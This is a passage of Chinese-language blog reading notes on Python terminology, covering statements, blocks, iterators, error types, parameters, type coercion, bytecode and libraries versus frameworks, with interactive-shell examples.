语句和表达式"></a>7.2.1　语句和表达式</h3><p>　　<strong>表达式</strong>是由运算符和值组成的指令，可以推导出单一的值。这个值可以是变量（包含值）或者函数调用（返回值）。按照这个定义，<code>2 + 2</code>是一个表达式，它的结果是<code>4</code>。<code>len(myName) &gt; 4</code>、<code>myName.isupper()</code>、<code>myName == &#39;Zophie&#39;</code>也是表达式。一个值本身也是一个表达式，它的结果就是它自己。</p><p>　　<strong>语句</strong>实际上是Python中的所有其他指令，包括<code>if</code>语句、<code>for</code>语句、<code>def</code>语句和<code>return</code>语句等。语句并不能推导得到一个值。一些语句可能包含表达式，比如赋值语句<code>spam = 2 + 2</code>，或者<code>if</code>语句<code>if myName == &#39;Zophie&#39;:</code>。</p><p>　　Python 3使用<code>print()</code>函数，Python 2则使用<code>print</code>语句。看起来只是加了一对括号，但更重要的区别在于Python 3的<code>print()</code>函数具有返回值（虽然总是<code>None</code>），可以作为参数传递给其他函数，也可以被赋值给一个变量。语句是不能做这些操作的。不过在Python 2中也可以在<code>print</code>后添加一对括号，就像下面这个交互式shell示例：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Hello, world!&#x27;</span> <span class="hljs-comment"># 在Python 2中运行</span></span><br>Hello, world!<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, world!&#x27;</span>) <span class="hljs-comment"># 在Python 2中运行 ❶</span></span><br>Hello, world!<br></code></pre></td></tr></table></figure><p>尽管它看起来像是函数调用❶，但实际上还是一个用括号包裹着字符串值的<code>print</code>语句，就像赋值语句<code>spam = (2 + 2)</code>实际上等效于<code>spam = 2 + 2</code>一样。在Python 2和Python 3中，可以将多个值传递给<code>print</code>语句或者<code>print()</code>函数，就像下面这样：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>) <span class="hljs-comment"># 在Python 3中运行</span></span><br>Hello world<br></code></pre></td></tr></table></figure><p>　　但在Python 2中使用同样的代码会被解释为在<code>print</code>语句中传递一个包含两个字符串值的元组，输出如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>) <span class="hljs-comment"># 在Python 2中运行</span><br>(<span class="hljs-string">&#x27;Hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>)<br></code></pre></td></tr></table></figure><p>　　语句和由函数调用组成的表达式之间的差异虽然微妙，但切实存在。</p><h3 id="7-2-2-块、子句和主体"><a href="#7-2-2-块、子句和主体" class="headerlink" title="7.2.2　块、子句和主体"></a>7.2.2　块、子句和主体</h3><p>　　术语<strong>块</strong>、<strong>子句</strong>、<strong>主体</strong>经常混用，用来指代一组Python指令。块以缩进开始，当缩进回退时结束，比如在<code>if</code>语句或<code>for</code>语句后的代码被称为该语句的块。以冒号结尾的语句后会跟着一个新块，比如<code>if</code>、<code>else</code>、<code>for</code>、<code>while</code>、<code>def</code>、<code>class</code>等。</p><p>　　Python也支持单行块，虽然是有效的，但并不推荐。语法如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">name</span> == <span class="hljs-string">&#x27;Zophie&#x27;</span>: <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;Hello, kitty!&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>通过使用分号，以下这条<code>if</code>语句的块中还可以有多条指令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> name == <span class="hljs-string">&#x27;Zophie&#x27;</span>: <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, kitty!&#x27;</span>); <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Do you want a treat?&#x27;</span>)<br></code></pre></td></tr></table></figure><p>但在单行块中不能出现其他需要新块的语句。以下是无效的Python代码：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">name</span> == <span class="hljs-string">&#x27;Zophie&#x27;</span>: <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">age</span> &lt; <span class="hljs-number">2</span>: <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;Hello, kitten!&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>这之所以是无效的，是因为下一行的<code>else</code>语句无法准确地对应到<code>if</code>语句。Python官方文档更倾向使用术语“子句”而非“块”，下面的代码就是一个子句：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">name</span> == <span class="hljs-string">&#x27;Zophie&#x27;</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;Hello, kitty!&#x27;</span>)</span><br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;Do you want a treat?&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p><code>if</code>语句是子句的头，<code>if</code>语句内的两个<code>print()</code>调用是子句的内容，也被称为“主体”。Python官方文档使用“块”来指以单元形式执行的一段代码，比如一个模块、一个函数，或者一个类的定义。</p><h3 id="7-2-3-变量和特性"><a href="#7-2-3-变量和特性" class="headerlink" title="7.2.3　变量和特性"></a>7.2.3　变量和特性</h3><p>　　<strong>变量</strong>是指向对象的一个名字。援引官方文档，特性则是指“.（点）后面的任何名字”。特性是跟对象（点之前的名字）相关联的。例如，在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> datetime</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = datetime.datetime.now()</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam.year</span><br>2018<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam.month</span><br>1<br></code></pre></td></tr></table></figure><p>在这个代码示例中，<code>spam</code>是一个值为<code>datetime</code>对象（<code>datetime.datetime.now()</code>的返回值）的变量，<code>year</code>和<code>month</code>都是这个对象的特性。再举个例子，<code>sys.exit()</code>中的<code>exit()</code>函数也被视为是<code>sys</code>模块对象的一个特性。</p><p>　　在其他语言中，特性也被叫作字段、属性或成员变量。</p><h3 id="7-2-4-函数和方法"><a href="#7-2-4-函数和方法" class="headerlink" title="7.2.4　函数和方法"></a>7.2.4　函数和方法</h3><p>　　函数是在调用时被执行的代码的集合。方法是与类相关联的函数（或者叫作一个可调用的函数，第8章将对此说明），就像特性是与对象相关联的变量。函数包括内置函数和模块内的函数。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>)</span><br>5<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Hello&#x27;</span>.upper()</span><br>&#x27;HELLO&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> math</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.sqrt(<span class="hljs-number">25</span>)</span><br>5.0<br></code></pre></td></tr></table></figure><p>在这个示例中，<code>len()</code>是一个函数，而<code>upper()</code>是一个字符串方法。方法也被视为它们所绑定的对象的一个特性。注意，出现句点并不意味着使用的就一定是方法而非函数。<code>sqrt()</code>函数处于<code>math</code>模块中，而<code>math</code>并不是一个类，所以<code>sqrt()</code>自然也不是类的方法。</p><h3 id="7-2-5-可迭代对象和迭代器"><a href="#7-2-5-可迭代对象和迭代器" class="headerlink" title="7.2.5　可迭代对象和迭代器"></a>7.2.5　可迭代对象和迭代器</h3><p>　　Python的<code>for</code>循环是个多面手。语句<code>for i in range(3):</code>会将块内的代码执行3次。<code>range(3)</code>调用不仅仅是Python告诉<code>for</code>循环“重复执行代码3次”。调用<code>range(3)</code>会返回一个范围对象，就像调用<code>list(&#39;cat&#39;)</code>会返回一个列表对象一样，两者都是<strong>可迭代对象</strong>。</p><p>　　<code>for</code>循环会使用可迭代对象。在交互式shell中输入以下内容，查看<code>for</code>循环如何对范围对象和列表对象进行迭代：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">  <span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># for循环的内容</span></span><br><span class="hljs-meta prompt_">...</span><br>0<br>1<br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>]:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">  <span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># for循环的内容</span></span><br><span class="hljs-meta prompt_">...</span><br>c<br>a<br>t<br></code></pre></td></tr></table></figure><p>　　所有的序列类型都是迭代器，比如范围、列表、元组、字符串对象。一些容器对象也是迭代器，比如字典、集合和文件对象。</p><p>　　<code>for</code>循环的背后实际上有很多技术细节。在幕后，<code>for</code>循环会调用Python内置的<code>iter()</code>函数和<code>next()</code>函数。当<code>for</code>循环运行时，可迭代对象被传递给内置的<code>iter()</code>函数，作为迭代器对象被返回。迭代器对象会一直跟踪循环中使用的可迭代对象的下一项。在循环的每一次迭代中，将迭代器对象传递给内置的<code>next()</code>就可以返回迭代器中的下一项。我们可以手动调用<code>iter()</code>函数和<code>next()</code>函数直观地查看<code>for</code>循环的工作原理。在交互式shell中输入以下内容，执行与上个循环示例相同的指令：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iterableObj = <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iterableObj</span><br>range(0, 3)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iteratorObj = <span class="hljs-built_in">iter</span>(iterableObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">i = <span class="hljs-built_in">next</span>(iteratorObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 循环的内容</span></span><br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">i = <span class="hljs-built_in">next</span>(iteratorObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 循环的内容</span></span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">i = <span class="hljs-built_in">next</span>(iteratorObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 循环的内容</span></span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">i = <span class="hljs-built_in">next</span>(iteratorObj)</span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>StopIteration ❶<br></code></pre></td></tr></table></figure><p>注意，当迭代器返回了最后一项后还继续调用<code>next()</code>，Python会抛出<code>StopIteration</code>异常❶。不过程序并不会崩溃并显示错误信息。它是Python内置用来使<code>for</code>循环判断何时停止循环的条件。</p><p>　　一个迭代器只能在一个可迭代项上迭代一次。类似于只能用<code>open()</code>和<code>readlines()</code>读取一次文件的内容，如果想再次读取，需要重新打开文件。如果想再次遍历可迭代对象，必须再次调用<code>iter()</code>，以创建一个新的迭代器。只要你愿意，可以创建多个迭代器对象，每个迭代器对象会独立地追踪下一个返回的项。在交互式shell中输入以下内容，观察运行情况：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iterableObj = <span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;cat&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iterableObj</span><br>[&#x27;c&#x27;, &#x27;a&#x27;, &#x27;t&#x27;]<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iteratorObj1 = <span class="hljs-built_in">iter</span>(iterableObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">iteratorObj2 = <span class="hljs-built_in">iter</span>(iterableObj)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">next</span>(iteratorObj1)</span><br>&#x27;c&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">next</span>(iteratorObj1)</span><br>&#x27;a&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">next</span>(iteratorObj2)</span><br>&#x27;c&#x27;<br></code></pre></td></tr></table></figure><p>要点在于可迭代对象作为参数传递给<code>iter()</code>函数，并返回一个迭代器对象。迭代器对象作为参数传递给<code>next()</code>函数。当你使用<code>class</code>语句创建自定义的数据类型时，只要实现<code>__iter__</code>和<code>__next__</code>这两个特殊方法，就能使用<code>for</code>循环遍历对象。</p><h3 id="7-2-6-语法错误、运行时错误和语义错误"><a href="#7-2-6-语法错误、运行时错误和语义错误" class="headerlink" title="7.2.6　语法错误、运行时错误和语义错误"></a>7.2.6　语法错误、运行时错误和语义错误</h3><p>　　错误的分类方式数不胜数。但大体上看，所有的编程错误都可以被分为3类：语法错误、运行时错误和语义错误。</p><p>　　<strong>语法</strong>是某种编程语言中有效指令的规则集。缺少小括号、用句点错误地代替了逗号或者拼写错误都是<strong>语法错误</strong>，程序会在运行时即刻抛出<code>SyntaxError</code>。</p><p>　　语法错误也被称为<strong>解析错误</strong>，当Python指令不能将源代码的文本解析成有效的指令时，就会发生语法错误。拿人类语言打比方的话，语法错误相当于语法不正确或者将一连串没有意义的词组拼凑成句子，比如“未受污染的奶酪肯定它是”。3</p><p>3正确的语句是“它肯定是未受污染的奶酪”。——译者注</p><p>　　计算机不能读懂程序员的内心想法，它需要具体的指令，而存在语法错误时，计算机无法明确要做什么，所以程序根本不会运行。</p><p>　<strong>运行时错误</strong>是指运行中的程序不能执行某些任务，比如试图打开一个不存在的文件或者将一个数字除以0。拿人类语言打比方的话，运行时错误相当于给出一个不可能的指令，像是“画一个有三条边的正方形”。运行时错误如果没有被处理，程序就会崩溃并显示回溯信息。可以使用<code>try-except</code>语句捕获运行时错误并进行错误处理。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">slices = <span class="hljs-number">8</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">eaters = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Each person eats&#x27;</span>, slices / eaters, <span class="hljs-string">&#x27;slices.&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>这段代码在运行时会展示以下回溯信息：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;pyshell#4&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;Each person eats&#x27;</span>, slices / eaters, <span class="hljs-string">&#x27;slices.&#x27;</span>)<br>ZeroDivisionError: division by zero<br></code></pre></td></tr></table></figure><p>　　要知道回溯信息中提到的行号只是Python解释器检查到错误的地方，造成错误的真正原因可能是在前一行代码，甚至是更靠前的地方。明白这一点非常重要。</p><p>　　一般而言，源代码中的语法错误会在程序运行前被解释器捕获，但语法错误也有可能在运行时发生。<code>eval()</code>函数可以接受一串Python代码并运行，这就可能导致运行时产生<code>SyntaxError</code>。例如，<code>eval(&#39;print(&quot;Hello, world)&#39;)</code>缺少了标记字符串结束的双引号，而程序在调用<code>eval()</code>之前不会察觉到错误。</p><p>　　<strong>语义错误</strong>（也称为<strong>逻辑错误</strong>）是一种更为微妙的错误。语义错误并不会显示错误信息或者导致崩溃，但计算机执行指令的方式会跟程序员预想的不同。拿人类语言打比方的话，语义错误相当于告诉计算机：“从商店买一盒牛奶，如果有鸡蛋，买一打。”结果是计算机会买13盒牛奶。（计算机理解的是，先买一盒牛奶，因为商店有鸡蛋，所以又买一打牛奶，一共13盒。）计算机无法判断对错，只会原原本本地按照你的指示去做。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;The sum of 4 and 2 is&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span> + <span class="hljs-string">&#x27;2&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>你会得到以下输出：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">The</span> sum of <span class="hljs-number">4</span> and <span class="hljs-number">2</span> is <span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>显然42是个错误答案。但请注意，程序并没有崩溃。Python的<code>+</code>运算符既可以计算整数之和，也可以用来连接字符串。错误地使用字符串<code>&#39;4&#39;</code>和<code>&#39;2&#39;</code>而非整数类型的<code>4</code>和<code>2</code>导致了这一错误。</p><h3 id="7-2-7-形参和实参"><a href="#7-2-7-形参和实参" class="headerlink" title="7.2.7　形参和实参"></a>7.2.7　形参和实参</h3><p>　　<strong>形参</strong>是<code>def</code>语句中括号内的变量名称。<strong>实参</strong>是函数调用中实际传递的值，会被赋给形参。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greeting</span>(<span class="hljs-params">name, species</span>): ❶</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(name + <span class="hljs-string">&#x27; is a &#x27;</span> + description)</span><br><span class="hljs-meta prompt_">...</span><br>&gt;&gt;  greeting(&#x27;Zophie&#x27;, &#x27;cat&#x27;) ❷<br>Zophie is a cat<br></code></pre></td></tr></table></figure><p>在<code>def</code>语句中，<code>name</code>和<code>species</code>都是形参❶。在函数调用语句中，<code>&#39;Zophie&#39;</code>和<code>&#39;cat&#39;</code>是实参❷。这两个术语经常被混用，统称为<strong>参数</strong>。在这个示例中，形参对应的就是变量，实参对应的就是值。</p><h3 id="7-2-8-显式类型转换和隐式类型转换"><a href="#7-2-8-显式类型转换和隐式类型转换" class="headerlink" title="7.2.8　显式类型转换和隐式类型转换"></a>7.2.8　显式类型转换和隐式类型转换</h3><p>　　你可以将一个类型的对象转换为另一个类型。比如，<code>int(&#39;42&#39;)</code>会把字符串<code>&#39;42&#39;</code>转换成整数<code>42</code>。实际上，并非是字符串对象<code>&#39;42&#39;</code>本身被转换了，而是<code>int()</code>函数基于原对象创建了一个新的整数对象。虽然程序员都将这个过程称为对象转换，但实际上这种转换的原理是基于一个模子创建新的对象。</p><p>　　Python经常隐含地进行类型转换，比如在计算表达式<code>2 + 3.0 = 5.0</code>时，数值<code>2</code>和<code>3.0</code>被强制转换成了<code>+</code>运算符可以处理的相同数据类型。这种转换被称为<strong>隐式转换</strong>。</p><p>　　隐式转换有时可能导致意想不到的结果。Python中的布尔值<code>True</code>和<code>False</code>可以分别被强制转换成整数值<code>1</code>和<code>0</code>。这意味着表达式<code>True + False + True</code>等效于<code>1 + 0 + 1</code>，结果为<code>2</code>，不过实际的代码一般不会这样写。在学到这个知识点后，你可能会有一个有趣的想法：把布尔列表传递给<code>sum()</code>可以计算出列表中真值的数量。不过，调用列表的<code>count()</code>方法速度会更快。</p><h3 id="7-2-9-属性和特性"><a href="#7-2-9-属性和特性" class="headerlink" title="7.2.9　属性和特性"></a>7.2.9　属性和特性</h3><p>　　在许多语言中，术语<strong>属性</strong>和<strong>特性</strong>是同义词，但在Python中是有区别的。7.2.3节将“特性”解释为与对象绑定的一个名字。特性包括对象的成员变量和方法。</p><p>　　有些语言（如Java）的类有getter方法和setter方法，程序不能直接对某个属性赋值（为了避免被赋予无效值），而是需要调用setter方法设置属性。setter方法可以确保成员变量不会被分配到无效值。getter方法读取特性的值。如果一个特性的名称为<code>accountBalance</code>，那么它的setter方法和getter方法通常被分别命名为<code>setAcccountBalance()</code>和<code>getAccountBalance()</code>。</p><p>　　Python中的属性允许程序员通过更简洁的语法使用getter和setter。第17章将对Python的属性进行详细的探讨。</p><h3 id="7-2-10-字节码和机器码"><a href="#7-2-10-字节码和机器码" class="headerlink" title="7.2.10　字节码和机器码"></a>7.2.10　字节码和机器码</h3><p>　　源代码被编译成一种叫作<strong>机器码</strong>的指令形式，由CPU直接执行。机器码由CPU<strong>指令集</strong>（机器内置的指令集合）的指令组成。由机器码组成的编译程序被称为<strong>二进制程序</strong>。像C这样经典的语言有可以将C源代码编译成几乎所有CPU都可以使用的二进制文件的编译器软件。如果像Python这样的语言也想在同样的CPU上运行，就必须为每一个CPU编写一个Python编译器，而这工作量太大了。</p><p>　　除了创建直接由CPU硬件执行的机器码，还有另外一种将源代码转化为机器可使用的代码的方法，那就是创建<strong>字节码</strong>，也叫作<strong>可移植代码</strong>。字节码由解释器程序执行，而非直接由CPU执行。Python的字节码是由一个指令集中的指令组成的，但它并非是真的CPU的指令集。Python的字节码与.py文件存放在同一个文件夹中，文件扩展名为.pyc。CPython解释器是用C语言编写的，它可以将Python源代码编译成Python字节码，然后执行这些指令。（Java虚拟机也是这样，它执行的是Java字节码。）因为它是用C语言编写的，所以可以为C语言已经适配的任何CPU编译。</p><p>　　可以看看Scott Sanderson和Joe Jevnik在PyCon 2016上发表的演讲“Playing with Python Bytecode”（和Python字节码的游戏），这是学习这一知识点的优秀资源。</p><h3 id="7-2-11-脚本和程序，以及脚本语言和编程语言"><a href="#7-2-11-脚本和程序，以及脚本语言和编程语言" class="headerlink" title="7.2.11　脚本和程序，以及脚本语言和编程语言"></a>7.2.11　脚本和程序，以及脚本语言和编程语言</h3><p>　　脚本和程序，以及脚本语言和编程语言的区别一向是模糊的，具有随意性。应该说，所有的脚本都是程序，所有的脚本语言都是编程语言。但是脚本语言一般被视为更容易的或者“不太够资格”的编程语言。区分脚本和程序的一个方法是根据代码的执行方式。脚本语言编写的脚本是直接从源代码解释运行的，而编程语言编写的程序则要被编译成二进制文件再执行。尽管Python程序运行时会有编译字节码的步骤，但它通常被认为是一种脚本语言。而Java跟Python一样生成字节码而非机器码二进制文件，但它一般不被视为脚本语言。从技术角度来讲，语言本身并不存在编译型或者解释型的区别，而是有编译器或者解释器的实现。实际上，任何语言都可以有解释器或者编译器。</p><p>　　这种差异可以拿来争论，但并无太大意义。脚本语言不一定不够强大，编程语言也不一定就更难运用。</p><h3 id="7-2-12-库、框架、SDK、引擎、API"><a href="#7-2-12-库、框架、SDK、引擎、API" class="headerlink" title="7.2.12　库、框架、SDK、引擎、API"></a>7.2.12　库、框架、SDK、引擎、API</h3><p>　　使用别人的代码可以节省大量时间。你可能经常会找打包好的库、框架、SDK、引擎或API来使用。它们的区别很微妙但很重要。</p><p>　　<strong>库</strong>是一个通用术语，用来指第三方制作的代码集合。库可以包含供开发人员使用的函数、类或者其他代码片段。Python库可能包含一个或一组包，甚至只是一个模块。库通常是限于特定语言的。开发人员不需要知道库的代码如何工作，只需要知道如何调用或者接入库中的代码。标准库（比如Python标准库）是指适用于该语言的所有实现的代码库。</p><p>　　<strong>框架</strong>是代码的集合，通过<strong>控制反转</strong>的方式运行。框架会根据需要调用开发人员创建的函数，而不是开发人员调用框架中的函数。控制反转的一种通俗描述是：“不要给我们打电话，我们会给你打电话。”举例来说，使用Web应用框架编写代码时需要为网页创建函数，以便Web请求进入时框架会调用这些函数。</p><p>　　<strong>软件开发套件</strong>（software development kit，SDK）包括代码库、文档和软件工具，它们用来协助为特定的操作系统或平台创建应用程序。比如Android SDK和iOS SDK分别用于为Android和iOS创建移动应用程序，Java开发工具包（JDK）是Java虚拟机创建应用程序的SDK。</p><p>　　<strong>引擎</strong>是一个大型、独立的系统，开发人员的软件可以对其进行外部控制。开发人员通常调用引擎中的函数执行大型的复杂任务。引擎包括游戏引擎、物理引擎、推荐引擎、数据库引擎、国际象棋引擎和搜索引擎等。</p><p>　　<strong>应用程序接口</strong>（application programming interface，API）是库、SDK、框架或引擎的对外接口。API规定了如何调用函数或向库提出访问资源的请求。库的作者会提供（希望如此）API文档。许多流行的社交类或其他类型的网站提供了HTTP API，允许程序访问它们的服务，而不是由人使用浏览器访问。使用这些API，你可以编写出能够自动发布Facebook信息或者阅读Twitter的最新消息的程序。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之python之禅（六）</title>
    <link href="/2024/01/06/616python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bpython%E4%B9%8B%E7%A6%85%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <url>/2024/01/06/616python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bpython%E4%B9%8B%E7%A6%85%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    
